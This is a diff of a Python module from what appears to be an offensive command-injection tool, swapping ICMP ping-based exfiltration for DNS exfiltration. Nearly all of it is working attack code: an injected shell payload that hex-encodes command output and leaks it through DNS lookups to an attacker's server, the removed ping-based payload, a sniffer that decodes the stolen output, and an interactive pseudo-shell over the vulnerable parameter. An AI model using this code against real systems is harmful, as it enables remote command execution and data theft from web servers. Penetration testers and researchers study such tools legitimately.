@@ -60,33 +60,29 @@ except ImportError:
 
 
 """
-The ICMP exfiltration technique: 
-exfiltrate data using the ping utility.
+The DNS exfiltration technique: 
+exfiltrate data using a user-defined DNS server [1].
 
-[1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
-[2] http://blog.curesec.com/article/blog/23.html
+[1] http://www.contextis.com/resources/blog/data-exfiltration-blind-os-command-injection/
 """
 
-def packet_handler(Packet):
-  if Packet.haslayer(ICMP):
-    Data = Packet.getlayer(ICMP).getlayer(Raw)
-    sys.stdout.write(Data.load[8:])
-    sys.stdout.flush()
-
+def querysniff(pkt):
+  if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
+    if ".xxx" in pkt.getlayer(DNS).qd.qname:
+      print pkt.getlayer(DNS).qd.qname.split(".xxx")[0].decode("hex")
 
 def signal_handler(signal, frame):
   os._exit(0)
 
-def snif(ip_dst, ip_src):
-  print( Style.BRIGHT + "(!) Started the sniffer between " + Fore.YELLOW + ip_src + Style.RESET_ALL + Style.BRIGHT + 
-        " and " + Fore.YELLOW + ip_dst + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
-  
+def snif(dns_server):
+  print( Style.BRIGHT + "(!) Started the sniffer between you" + Style.BRIGHT + 
+          " and the DNS server " + Fore.YELLOW + dns_server + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
   while True:
-    sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
+    sniff(filter="port 53", prn=querysniff, store = 0)
  
-def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
-  # ICMP exfiltration payload.
-  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do ping -p $line -c 1 -s16 -q " + ip_src + "; done")
+def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
+  # DNS exfiltration payload.
+  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
   
   # Check if defined "--verbose" option.
   if menu.options.verbose:
@@ -105,9 +101,8 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   response = urllib2.urlopen(req)
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
-  print ""
-  
-def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
+
+def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
 
   err_msg = ""
   if menu.enumeration_options():
@@ -119,7 +114,7 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
 
   if err_msg != "":
     print Fore.YELLOW + settings.WARNING_SIGN + "The " + err_msg + " options are not supported by this module because of the structure of the exfiltrated data. Please try using any unix-like commands manually." + Style.RESET_ALL 
-     
+  
   # Pseudo-Terminal shell
   go_back = False
   go_back_again = False
@@ -156,7 +151,7 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
               print Fore.YELLOW + settings.WARNING_SIGN + "This option is not supported by this module." + Style.RESET_ALL + "\n"
           else:
             # Command execution results.
-            cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
+            cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
 
         except KeyboardInterrupt:
           print ""
@@ -181,23 +176,23 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
       pass
 
 
-def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique):
-  signal.signal(signal.SIGINT, signal_handler)
-  sniffer_thread = threading.Thread(target=snif, args=(ip_dst, ip_src, )).start()
-  time.sleep(2)
+def exploitation(dns_server, url, http_request_method, vuln_parameter, technique):
+  #signal.signal(signal.SIGINT, signal_handler)
+  sniffer_thread = threading.Thread(target=snif, args=(dns_server, )).start()
+  #time.sleep(2)
   if menu.options.os_cmd:
     cmd = menu.options.os_cmd
-    cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
+    cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
     print ""
     os._exit(0)
   else:
-    input_cmd(http_request_method, url, vuln_parameter, ip_src, technique)
+    input_cmd(dns_server, http_request_method, url, vuln_parameter, technique)
 
 
-def icmp_exfiltration_handler(url, http_request_method):
+def dns_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
-    print Back.RED + settings.ERROR_SIGN + "You need to have root privileges to run this option." + Style.RESET_ALL + "\n"
+    print "\n" + Back.RED + settings.ERROR_SIGN + "You need to have root privileges to run this option." + Style.RESET_ALL
     os._exit(0)
 
   if http_request_method == "GET":
@@ -252,26 +247,11 @@ def icmp_exfiltration_handler(url, http_request_method):
         else:
           os._exit(0)
 
-  if settings.TARGET_OS == "win":
-    print Back.RED + settings.ERROR_SIGN + "This module's payloads are not suppoted by the identified target operating system." + Style.RESET_ALL + "\n"
-    os._exit(0)
-
-  else:
-    technique = "ICMP exfiltration module"
-    sys.stdout.write(settings.INFO_SIGN + "Loading the " + technique + ". \n")
-    sys.stdout.flush()
-
-    ip_data = menu.options.ip_icmp_data
-
-    #  Source IP address
-    ip_src =  re.findall(r"ip_src=(.*),", ip_data)
-    ip_src = ''.join(ip_src)
-
-    # Destination IP address
-    ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
-    ip_dst = ''.join(ip_dst)
-    
-    exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)
+  dns_server = menu.options.dns_server
+      
+  technique = "DNS exfiltration module"
+  sys.stdout.write(settings.INFO_SIGN + "Loading the " + technique + ". \n")
+  exploitation(dns_server, url, http_request_method, vuln_parameter, technique)
 
 if __name__ == "__main__":
-  icmp_exfiltration_handler(url, http_request_method)
+  dns_exfiltration_handler(url, http_request_method)
